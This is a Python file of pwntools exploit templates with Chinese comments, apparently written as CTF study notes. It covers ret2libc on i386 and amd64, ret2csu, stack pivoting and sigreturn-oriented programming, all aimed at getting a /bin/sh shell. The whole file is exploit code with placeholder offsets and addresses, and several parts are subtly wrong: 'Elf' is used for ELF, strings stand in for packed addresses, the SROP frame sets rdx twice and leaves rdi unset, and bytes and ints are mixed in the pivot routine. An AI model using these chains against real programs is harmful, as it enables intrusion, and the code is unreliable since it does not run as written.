from pwn import *
from LibcSearcher import LibcSearcher

def ret2libc_i386_mannul():
    '''
    ret2libc，X86架构下，手动写rop链
    一般是结合LibcSearcher进行泄露system地址
    如果需要一些其他的操作，可以找一些pop指令用于清理栈
    
    '''
    elf = Elf('')
    io = process('')
    payload = b'xxx' # 前面的偏移
    payload += b'puts_plt' # 用于泄露地址的函数
    payload += elf.sym['main'] # 返回main函数
    payload += elf.got['puts'] # 要泄露的函数的got地址，这里泄露puts函数的地址
    io.send(payload)
    leak_addr = io.recv(4) # 获取到puts的地址
    # 接下来利用libcsearcher库来泄露函数地址
    libc = LibcSearcher('puts', leak_addr)
    libc_base_addr = leak_addr - libc.dump('puts')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 第二次填充payload，执行system /bin/sh
    payload = b'xxx'
    payload += p32(system_addr)
    payload += b'aaaa'
    payload += p32(str_bin_sh)
    io.send(payload)
    

def ret2libc_amd64_mannual():
    '''
    ret2libc X64架构下 手动写payload
    '''
    elf = Elf('')
    io = process('')
    pop_rdi_ret_addr = 0x0 # 一下三个都是gadget，可以利用ROPgadget工具寻找
    pop_rsi_ret_addr = 0x0
    pop_rdx_ret_addr = 0x0
    payload = b'xxx' # 前面的偏移，直到函数返回地址
    payload += p64(pop_rdi_ret_addr) + p64(1) # write函数的第一个参数
    payload += p64(pop_rsi_ret_addr) + p64(elf.got['read']) # 第二个参数
    payload += p64(pop_rdx_ret_addr) + p64(0x20) # 第三个参数
    payload += p64(elf.plt['write']) # write函数的地址
    io.send(payload) 
    leak_addr = io.recv(6) #泄露出来的地址
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    payload = b'xxx'
    payload += p64(pop_rdi_ret_addr) + p64(str_bin_sh)
    payload += p64(system_addr)
    io.send(payload)


def ret2libc_pwntools():
    '''
    ret2libc。
    利用pwntools的工具来写payload，主要利用ROP类
    记得设置一下context, 改下架构即可
    '''
    context.update(arch='i386/amd64', os='linux', endian='little')
    elf = Elf('')
    io = process('')
    rop = ROP(elf)
    rop.raw(b'xxx') # 前面的填充
    rop.call('write', [1, elf.got['write'], 0x10]) # 调用write函数
    rop.call('main', []) # 回到main函数
    print(rop.dump()) # 这里打印下rop，可以检查一下有没有问题
    payload = rop.chain() # 生成payload
    io.send(payload)
    leak_addr = io.recv()
    # 利用libc来计算
    libc = LibcSearcher('read', leak_addr)
    libc_base_addr = leak_addr - libc.dump('read')
    system_addr = libc_base_addr + libc.dump('system')
    str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
    
    # 这里调用system可以这样
    rop = ROP(elf)
    rop.raw(b'xxx')
    rop.call(system_addr, [str_bin_sh])
    io.send(rop.chain())


def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
            r12, r13, r14, r15, rbx=0, rbp=1):
    """
    return2csu
    一般程序找不到pop rdx的gadget，需要利用write或者read函数。
    这里需要找好r13 r14 r15和rdi rsi rdx之间的对应关系，还要分清是rdi还是edi
    如果是edi，只能控制低4个字节的内容
    此处示例为r13---rdx r14---rsi r15---edi
    """
    io = process('')
    cur_elf = ELF('')
    
    # ret2csu
    payload = b'a' * 0x0 # 前面的填充
    payload += p64(csu_end_addr) # 这个地址一般对应的指令为pop rbx
    payload += p64(rbx) # 0
    payload += p64(rbp) # 1
    payload += p64(r12) # 一般会填func@got，调用函数
    payload += p64(r13) # 对应的是rdx
    payload += p64(r14) # 对应的是rsi
    payload += p64(r15) # 对应的edi
    payload += p64(csu_start_addr) # 这里对应的指令一般是mov rdx r13
    payload += 0x38 * b'a' # 栈会被抬高0x38个字节，这里也可以布局rbp的值，用于后续栈迁移等
    payload += p64(ret_addr) # 调用完csu链后返回的地址，比如main函数地址
    
    print("len of payload:{}".format(payload))
    io.send(payload)
    
  
def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
    '''
    栈迁移：程序溢出的字节数为两个指针大小，只能覆盖到函数返回地址
    将栈迁移到其他可写入的地方，如bss段，data段，libc的free_hook上方
    需要寻找一个leave;ret的gadget, 这里以64位为例
    
    '''  
    # 第一步是往fake_rbp_addr写入rop链
    payload = fake_rbp_addr + 0x200 # fake rbp 2
    payload += 0x0 # 这里开始，可以填写真正的rop链，如要执行的函数地址等
    # ......
    io.read(0, fake_rbp_addr, 0x60) # 触发某写入函数，往地址里面写入ROP
    
    # 第二步是控制栈溢出
    payload = 0x0 * b'a' # junk data
    payload += p64(fake_rbp_addr) # 填充rbp
    payload += p64(leave_ret_addr) # 填充返回地址
    io.send(payload)
    
    # 之后，程序会取执行rop链


def ret2sigReturn():
    '''
    SROP: 要么有触发sigReturn的gadget，要么可以利用mov rax 15;syscall来触发。
    这里还需要/bin/sh的地址，需要想办法泄露出来
    栈空间要足够大，如果不够大，可以考虑栈迁移，填充的栈从低到高依次为：
    mov rax 0xf
    syscall_ret gadget
    sigreturnFrame
    
    '''
    # 需要注意，要设置一下context.arch 和kernel，如下所示
    # 如果系统为32位，程序位32位
    context.arch='i386'
    frame = SigreturnFrame(kernel='i386')
    # 如果是64位系统 64位程序
    context.arch = 'amd64'
    frame = SigreturnFrame(kernel='amd64')
    
    # 如果是64位系统下跑32位程序
    context.arch = 'i386'
    frame = SigreturnFrame(kernel='amd64')
    
    # 以下位payload
    payload = b'/bin/sh\x00' + b'a' * 0x0 # 这里注意，如果没有/bin/sh地址可以将/bin/sh写在栈上，然后泄露栈地址，计算偏移。这里覆盖到rbp。
    payload += b'mov rax, 0xf' # 执行该指令的地址
    payload += b'syscall; ret' # 该gadget的地址
    # 以下为sigreturn 帧
    frame.rax = 0x3b
    frame.rdx = b'/bin/sh addr' # /bin/sh的地址
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = b'syscall' # syscall的地址
    frame.rsp = 0x00 # 如果想继续往下执行，可以把上面的rip改为syscall ; ret。然后rsp改为下一个帧的起始地址。如果不需要的话，可以设为0。
    
    # 注意：如果是32位程序，构造frame的时候，一定要把下面这些值加上，否则可能会crash
    frame.cs = 35
    frame.ss = 43
    frame.ds = 43
    frame.es = 43
    frame.gs = 0
    frame.fs = 0
    
    payload += bytes(frame)
    
    # io.send(payload) # 发送出去即可
    
    
    
    
    